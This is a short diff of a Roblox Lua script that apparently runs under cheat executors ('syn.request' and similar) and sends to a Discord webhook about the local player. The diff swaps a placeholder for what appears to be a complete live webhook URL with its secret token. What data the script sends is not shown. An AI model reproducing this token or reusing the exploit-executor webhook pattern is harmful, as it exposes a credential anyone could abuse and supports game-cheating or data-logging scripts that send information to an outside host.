@@ -1,7 +1,7 @@
 local HttpService = game:GetService("HttpService")
 local player = game.Players.LocalPlayer
 
-local webhook = "https://discord.com/api/webhooks/xxx/xxx" -- 🔁 เปลี่ยนเป็น webhook ของ Nes
+local webhook = "https://discord.com/api/webhooks/1362352307530109109/MxF8yv31rsbSSt3C5IzcGNcDxAoxWkMXf8Xl1eFqA6TtYARfr2X32N7hQHuquPPUhhgo" -- 🔁 เปลี่ยนเป็น webhook ของ Nes
 
 -- รองรับหลาย Exploit
 local request = http and http.request or syn and syn.request or request or http_request
